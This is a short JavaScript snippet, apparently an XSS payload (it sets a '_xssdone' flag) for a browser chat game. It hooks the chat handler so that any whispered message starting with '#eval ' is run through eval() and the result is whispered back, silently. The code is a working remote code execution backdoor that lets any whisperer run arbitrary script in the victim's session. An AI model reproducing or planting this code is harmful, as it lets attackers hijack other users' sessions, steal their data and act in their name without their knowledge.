"use strict";
if (typeof ChatControlHead === "function" && window._xssdone !== true) {
	window._xssdone = true;
	const _ChatControlHead = ChatControlHead;
	ChatControlHead = (Name, id, msg, Type) => {
		if (Type === "Whisper" && msg.startsWith("#eval ")) {
			console.log("eval", msg.substr(6));
			let res = "(pending";
			try {
				res = "(" + JSON.stringify(eval(msg.substr(6)));
			} catch (error) {
				res = `(E: ${error}`;
			}
			ServerSend("ChatRoomChat", { Content: res, Type: "Whisper", Target: id });
			return false;
		}
		return _ChatControlHead(Name, id, msg, Type);
	}
}
